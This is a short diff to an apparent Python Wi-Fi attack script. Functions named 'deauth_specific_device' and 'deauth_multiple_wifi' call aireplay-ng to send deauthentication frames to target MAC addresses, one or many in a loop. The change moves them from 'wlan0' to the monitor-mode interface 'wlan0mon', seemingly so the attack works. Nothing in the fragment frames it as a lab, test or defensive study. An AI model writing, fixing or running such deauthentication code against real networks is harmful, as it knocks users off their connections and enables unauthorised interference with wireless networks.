@@ -57,11 +57,11 @@ def get_connected_devices():
     return devices
 
 def deauth_specific_device(mac):
-    subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0"])
+    subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0mon"])
 
 def deauth_multiple_wifi(macs):
     for mac in macs:
-        subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0"])
+        subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0mon"])
 
 def main():
     while True:
